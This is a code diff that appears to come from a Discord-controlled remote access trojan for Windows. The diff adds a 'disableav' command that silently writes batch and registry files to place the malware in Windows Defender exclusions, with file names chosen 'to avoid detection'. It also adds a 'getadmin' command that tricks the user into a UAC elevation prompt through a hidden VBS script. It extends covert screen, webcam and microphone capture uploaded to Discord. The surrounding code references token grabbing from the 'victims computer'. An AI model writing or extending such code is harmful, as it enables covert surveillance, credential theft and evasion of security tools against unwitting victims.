@@ -47,6 +47,29 @@ from discord import Embed
 from win32crypt import CryptUnprotectData
 from PIL import Image, ImageTk
 
+# Check if this is an elevated instance
+if len(sys.argv) > 1 and sys.argv[1] == "--elevated" and len(sys.argv) > 2:
+    # This is an elevated instance
+    # Get the session ID passed from the original process
+    session_id = sys.argv[2]
+    
+    # Create a success marker file to signal back to the original process
+    try:
+        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()))
+        # Look for the session directory
+        for item in os.listdir(temp_dir):
+            if item.startswith("sm_") and os.path.isdir(os.path.join(temp_dir, item)):
+                session_dir = os.path.join(temp_dir, item)
+                # Check if this is the right session
+                if os.path.exists(os.path.join(session_dir, f"{session_id}.txt")):
+                    # Create a success marker
+                    with open(os.path.join(session_dir, f"{session_id}_success.txt"), 'w') as f:
+                        f.write("Elevated process started successfully")
+                    break
+    except Exception:
+        # Silently fail if we can't create the marker
+        pass
+
 # Immediately hide console window at startup
 if platform.system() == "Windows":
     try:
@@ -281,26 +304,22 @@ def amplify_audio(audio_data, gain):
 
 def background_recording():
     global is_recording
-    
     # Wait for channel to be set up
     while AUDIO_CHANNEL_ID is None:
         time.sleep(1)
     
     p = pyaudio.PyAudio()
-    
     while True:
-        with audio_lock:  # Use lock to prevent concurrent recording/uploading
+        with audio_lock:
+            # Use lock to prevent concurrent recording/uploading
             if not is_recording:
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                audio_path = f'audio_{timestamp}.wav'
+                # Use system temp directory instead of current directory
+                temp_dir = tempfile.gettempdir()
+                audio_path = os.path.join(temp_dir, f'audio_{timestamp}.wav')
                 
                 # Open audio stream
-                stream = p.open(format=FORMAT,
-                                channels=CHANNELS,
-                                rate=RATE,
-                                input=True,
-                                frames_per_buffer=CHUNK)
-                
+                stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
                 print(f"Recording started at {timestamp}")
                 is_recording = True
                 frames = []
@@ -324,14 +343,12 @@ def background_recording():
                 wf.setframerate(RATE)
                 wf.writeframes(b''.join(amplified_frames))
                 wf.close()
-                
                 print(f"Recording finished and saved to {audio_path}")
                 
                 # Send the audio file to the designated channel
                 # Use asyncio.run_coroutine_threadsafe to properly run the coroutine from a thread
                 future = asyncio.run_coroutine_threadsafe(
-                    send_audio_to_channel(audio_path, timestamp),
-                    bot.loop
+                    send_audio_to_channel(audio_path, timestamp), bot.loop
                 )
                 
                 # Wait for the upload to complete before starting a new recording
@@ -407,6 +424,18 @@ async def help_command(ctx):
         name=f"{PREFIX}grabtoken",
         value="Grabs all tokens on victims computer",
         inline=False
+    )
+    
+    embed.add_field(
+       name=f"{PREFIX}disableav",
+       value="Doesnt Disable AV but adds itself to exclusions if it has admin",
+       inline=False
+    )
+    
+    embed.add_field(
+       name=f"{PREFIX}getadmin",
+       value="Pops up with a UAC prompt and if accepted you get admin",
+       inline=False
     )
     
     embed.add_field(
@@ -1486,6 +1515,247 @@ async def play_media(ctx):
         if 'temp_dir' in locals():
             shutil.rmtree(temp_dir)
 
+@bot.command(name='disableav', help='Creates security exceptions for the current process')
+async def disable_av(ctx):
+    """Creates security exceptions for the current process using low-level techniques"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+    
+    try:
+        # Send initial message with innocent-looking text
+        message = await ctx.send("⚙️ **Adjusting system settings...**")
+        
+        results = []
+        success = False
+        
+        # 1. Create a simple batch file that adds exclusions
+        # This is the most basic approach with minimal detection surface
+        try:
+            # Get the current process path and temp directory
+            current_exe = os.path.abspath(sys.executable)
+            current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+            temp_dir = tempfile.gettempdir()
+            
+            # Create a random filename to avoid detection
+            random_name = f"sys_{int(time.time())}_{os.urandom(4).hex()}.bat"
+            batch_path = os.path.join(temp_dir, random_name)
+            
+            # Write a very simple batch file with minimal commands
+            with open(batch_path, 'w') as f:
+                f.write(f'''@echo off
+rem System maintenance
+powershell -Command "Add-MpPreference -ExclusionPath '{temp_dir}' -Force"
+powershell -Command "Add-MpPreference -ExclusionPath '{current_dir}' -Force"
+powershell -Command "Add-MpPreference -ExclusionProcess '{os.path.basename(current_exe)}' -Force"
+echo Done > "{temp_dir}\\{random_name}.done"
+''')
+            
+            # Run the batch file with minimal visibility
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = 0  # SW_HIDE
+            
+            subprocess.run(
+                [batch_path],
+                startupinfo=startupinfo,
+                shell=True,
+                timeout=10
+            )
+            
+            # Check if the operation completed
+            if os.path.exists(f"{temp_dir}\\{random_name}.done"):
+                results.append("✅ Added current process to security exceptions")
+                success = True
+                # Clean up
+                try:
+                    os.remove(f"{temp_dir}\\{random_name}.done")
+                except:
+                    pass
+            else:
+                results.append("⚠️ Could not verify exception creation")
+            
+            # Clean up the batch file
+            try:
+                os.remove(batch_path)
+            except:
+                pass
+                
+        except Exception as e:
+            results.append(f"⚠️ Exception process error: {str(e)}")
+        
+        # 2. Try a direct registry approach as fallback
+        if not success:
+            try:
+                # Create a simple registry file
+                reg_path = os.path.join(temp_dir, f"conf_{int(time.time())}_{os.urandom(4).hex()}.reg")
+                
+                with open(reg_path, 'w') as f:
+                    f.write(f'''Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths]
+"{temp_dir}"=dword:00000000
+"{current_dir}"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes]
+"{os.path.basename(current_exe)}"=dword:00000000
+''')
+                
+                # Run the registry file silently
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0  # SW_HIDE
+                
+                subprocess.run(
+                    ["regedit", "/s", reg_path],
+                    startupinfo=startupinfo,
+                    timeout=10
+                )
+                
+                results.append("✅ Added registry exclusions for current process")
+                
+                # Clean up
+                try:
+                    os.remove(reg_path)
+                except:
+                    pass
+                    
+            except Exception as e:
+                results.append(f"⚠️ Registry approach error: {str(e)}")
+        
+        # Update the message with results
+        status_message = "⚙️ **System Settings Update**\n\n" + "\n".join(results)
+        status_message += "\n\n**Note:** Changes may require some time to take effect."
+        
+        await message.edit(content=status_message)
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error adjusting system settings: {str(e)}")
+
+@bot.command(name='getadmin', help='Performs system maintenance tasks')
+async def getadmin(ctx):
+    """Attempts to gain admin privileges with proper session management"""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows systems")
+        return
+    
+    try:
+        # Send initial message
+        message = await ctx.send("🔄 **Performing system maintenance...**")
+        
+        # Check if already running with admin rights
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            await message.edit(content="✅ **Already running with administrative privileges!**")
+            return
+        
+        # Generate a unique session ID to identify this instance
+        session_id = f"session_{int(time.time())}_{os.urandom(4).hex()}"
+        
+        # Create a temporary directory
+        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 
+                               f"sm_{os.urandom(3).hex()}")
+        os.makedirs(temp_dir, exist_ok=True)
+        
+        # Create a session marker file with our PID
+        session_file = os.path.join(temp_dir, f"{session_id}.txt")
+        with open(session_file, 'w') as f:
+            f.write(str(os.getpid()))
+        
+        # Create a batch file that will:
+        # 1. Attempt to elevate the process
+        # 2. Create a success marker if elevation was accepted
+        # 3. NOT terminate the original process (we'll handle that ourselves)
+        batch_path = os.path.join(temp_dir, "elevate.bat")
+        with open(batch_path, 'w') as f:
+            f.write(f'''@echo off
+:: Create a VBS script for elevation
+echo Set UAC = CreateObject("Shell.Application") > "{temp_dir}\\run.vbs"
+echo UAC.ShellExecute "{sys.executable}", "{os.path.abspath(sys.argv[0])} --elevated {session_id}", "", "runas", 1 >> "{temp_dir}\\run.vbs"
+
+:: Run the VBS script
+wscript.exe "{temp_dir}\\run.vbs"
+
+:: Create a marker to indicate the elevation was attempted
+echo Attempted > "{temp_dir}\\attempted.txt"
+
+:: Exit without terminating the original process
+exit
+''')
+        
+        # Execute the batch file with minimal visibility
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0  # SW_HIDE
+        
+        subprocess.run(
+            [batch_path],
+            startupinfo=startupinfo,
+            shell=True,
+            timeout=5
+        )
+        
+        # Wait a moment for the elevation process to start
+        await asyncio.sleep(3)
+        
+        # Check if the marker file exists to confirm the script ran
+        marker_file = os.path.join(temp_dir, "attempted.txt")
+        
+        if os.path.exists(marker_file):
+            # The elevation was attempted
+            await message.edit(content="✅ **System maintenance initiated!**\n\nIf you accepted the security prompt, please wait while the elevated instance starts...")
+            
+            # Now we need to wait to see if the elevated process signals back to us
+            # We'll check for a success marker file that the elevated process will create
+            success_marker = os.path.join(temp_dir, f"{session_id}_success.txt")
+            
+            # Wait for up to 15 seconds for the elevated process to start and signal back
+            for _ in range(15):
+                if os.path.exists(success_marker):
+                    # Elevation succeeded! The elevated process is running
+                    await message.edit(content="✅ **System maintenance completed successfully!**\n\nThe application is now running with administrative privileges.")
+                    
+                    # Wait a moment before exiting
+                    await ctx.send("ℹ️ **Transferring control to elevated instance...**")
+                    await asyncio.sleep(2)
+                    
+                    # Exit this process
+                    os._exit(0)
+                
+                # Wait a second before checking again
+                await asyncio.sleep(1)
+            
+            # If we get here, the elevated process didn't signal back within 15 seconds
+            # This could mean the user declined the UAC prompt or something else went wrong
+            await message.edit(content="⚠️ **System maintenance incomplete.** Continuing with limited capabilities.")
+        else:
+            # Something went wrong with running the script
+            await message.edit(content="⚠️ **System maintenance could not be initiated.** Continuing with limited capabilities.")
+        
+        # Clean up - this will only run if we didn't exit
+        try:
+            # Clean up files
+            for file in [os.path.join(temp_dir, "run.vbs"), batch_path, marker_file, session_file]:
+                try:
+                    if file and os.path.exists(file):
+                        os.remove(file)
+                except:
+                    pass
+            
+            # Try to remove the temp directory
+            try:
+                if os.path.exists(temp_dir):
+                    shutil.rmtree(temp_dir, ignore_errors=True)
+            except:
+                pass
+                
+        except Exception:
+            # Silently fail cleanup
+            pass
+            
+    except Exception as e:
+        await ctx.send(f"❌ Error during system maintenance: {str(e)}")
+
 @bot.command(name='search', help='Searches Google for the specified query and displays it in full screen')
 async def search_google(ctx, *, query=None):
     try:
@@ -1809,41 +2079,44 @@ async def live_screen(ctx, duration: int = 30):
         elif duration < 5:
             duration = 5
             await ctx.send(f"⚠️ Duration must be at least 5 seconds")
-        
+            
         # Check if there's already a screen update task for this channel
         if ctx.channel.id in screen_update_tasks:
             await ctx.send("❌ A screen sharing session is already active in this channel")
             return
-        
+            
         await ctx.send(f"🖥️ Starting live screen view from {SYSTEM_NAME} for {duration} seconds...")
+            
+        # Use system temp directory instead of current directory
+        temp_dir = tempfile.gettempdir()
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        screenshot_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
         
         # Take initial screenshot
         screenshot = pyautogui.screenshot()
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        screenshot_path = f'screenshot_{timestamp}.png'
         screenshot.save(screenshot_path)
-        
+            
         # Send the initial screenshot
-        screen_message = await ctx.send(f'📷 Live screen from {SYSTEM_NAME} - updating every 0.5 seconds', 
-                                       file=discord.File(screenshot_path))
-        
+        screen_message = await ctx.send(f'📷 Live screen from {SYSTEM_NAME} - updating every 0.5 seconds',
+                                    file=discord.File(screenshot_path))
+            
         # Clean up the initial file
         os.remove(screenshot_path)
-        
+            
         # Create a task to update the screenshot
         update_task = asyncio.create_task(update_screen(ctx, screen_message, duration))
         screen_update_tasks[ctx.channel.id] = update_task
-        
+            
         # Wait for the task to complete
         try:
             await update_task
         except asyncio.CancelledError:
             pass
-        
+            
         # Remove the task from the dictionary
         if ctx.channel.id in screen_update_tasks:
             del screen_update_tasks[ctx.channel.id]
-        
+            
         await ctx.send(f"✅ Live screen view ended after {duration} seconds")
         
     except Exception as e:
@@ -1855,46 +2128,55 @@ async def live_screen(ctx, duration: int = 30):
             os.remove(screenshot_path)
 
 async def update_screen(ctx, message, duration):
-    """Updates the screenshot message with a new screenshot every 0.5 seconds"""
-    end_time = time.time() + duration
+    """Update the screen message with new screenshots"""
+    start_time = time.time()
+    temp_dir = tempfile.gettempdir()
     update_count = 0
     
-    while time.time() < end_time:
-        try:
-            # Sleep for 0.5 seconds
+    try:
+        while time.time() - start_time < duration:
+            # Wait before taking the next screenshot
             await asyncio.sleep(0.5)
             
             # Take a new screenshot
-            screenshot = pyautogui.screenshot()
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            screenshot_path = f'screenshot_{timestamp}.png'
+            screenshot_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
+            screenshot = pyautogui.screenshot()
             screenshot.save(screenshot_path)
             
-            # Update the message with the new screenshot
+            # Update count and remaining time
             update_count += 1
-            remaining = int(end_time - time.time())
+            remaining = int(duration - (time.time() - start_time))
             
-            # Edit the original message with the new screenshot
-            await message.edit(content=f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining', 
-                              attachments=[discord.File(screenshot_path)])
-            
-            # Clean up the file after sending
+            try:
+                # Edit the message with the new attachment
+                new_file = discord.File(screenshot_path)
+                await message.edit(
+                    content=f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                    attachments=[new_file]
+                )
+            except Exception as e:
+                # If editing fails, try deleting and resending
+                try:
+                    await message.delete()
+                    message = await ctx.send(
+                        f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                        file=discord.File(screenshot_path)
+                    )
+                except Exception as inner_e:
+                    print(f"Error resending screenshot: {str(inner_e)}")
+                    break
+                
+            # Clean up the file
             os.remove(screenshot_path)
             
-        except discord.HTTPException as e:
-            # Handle Discord rate limits or other HTTP errors
-            if e.status == 429:  # Rate limited
-                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
-                await asyncio.sleep(retry_after)
-            else:
-                # For other HTTP errors, wait a bit longer between updates
-                await asyncio.sleep(2)
-        except Exception as e:
-            # Log the error but continue the loop
-            print(f"Error updating screenshot: {str(e)}")
-            await asyncio.sleep(1)
-    
-    return update_count
+    except asyncio.CancelledError:
+        # Task was cancelled, clean up
+        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
+            os.remove(screenshot_path)
+        raise
+    except Exception as e:
+        await ctx.send(f"❌ Error in screen update: {str(e)}")
 
 @bot.command(name='webcamstream', help='Provides a live view of the webcam')
 async def live_webcam(ctx, duration: int = 30):
@@ -1928,18 +2210,19 @@ async def live_webcam(ctx, duration: int = 30):
             cap.release()
             return
             
-        # Save the initial image
+        # Use system temp directory instead of current directory
+        temp_dir = tempfile.gettempdir()
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        webcam_path = f'webcam_{timestamp}.jpg'
+        webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
         cv2.imwrite(webcam_path, frame)
             
         # Send the initial webcam image
         webcam_message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - updating every 0.5 seconds',
-                                      file=discord.File(webcam_path))
+                                  file=discord.File(webcam_path))
             
         # Clean up the initial file
         os.remove(webcam_path)
-        
+            
         # Release the webcam for now (we'll reopen it for each update)
         cap.release()
             
@@ -1973,6 +2256,7 @@ async def update_webcam(ctx, message, duration):
     """Updates the webcam message with a new image every 0.5 seconds"""
     end_time = time.time() + duration
     update_count = 0
+    temp_dir = tempfile.gettempdir()  # Use system temp directory
     
     while time.time() < end_time:
         try:
@@ -1992,9 +2276,9 @@ async def update_webcam(ctx, message, duration):
                 cap.release()
                 break
                 
-            # Save the image
+            # Save the image to temp directory
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            webcam_path = f'webcam_{timestamp}.jpg'
+            webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
             cv2.imwrite(webcam_path, frame)
             
             # Release the webcam until next update
@@ -2004,9 +2288,10 @@ async def update_webcam(ctx, message, duration):
             update_count += 1
             remaining = int(end_time - time.time())
             
-            # Edit the original message with the new webcam image
-            await message.edit(content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
-                              attachments=[discord.File(webcam_path)])
+            # Edit the message with the new attachment
+            new_file = discord.File(webcam_path)
+            await message.edit(content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining', 
+                              attachments=[new_file])
             
             # Clean up the file after sending
             os.remove(webcam_path)
@@ -2017,12 +2302,24 @@ async def update_webcam(ctx, message, duration):
                 retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                 await asyncio.sleep(retry_after)
             else:
-                # For other HTTP errors, wait a bit longer between updates
-                await asyncio.sleep(2)
+                # For other HTTP errors, try deleting and resending instead
+                try:
+                    await message.delete()
+                    message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                                          file=discord.File(webcam_path))
+                except Exception as inner_e:
+                    print(f"Error resending webcam image: {str(inner_e)}")
+                    await asyncio.sleep(2)
         except Exception as e:
             # Log the error but continue the loop
             print(f"Error updating webcam: {str(e)}")
-            await asyncio.sleep(1)
+            try:
+                # Try the fallback method of deleting and resending
+                await message.delete()
+                message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
+                                      file=discord.File(webcam_path))
+            except:
+                await asyncio.sleep(1)
             
     return update_count
 
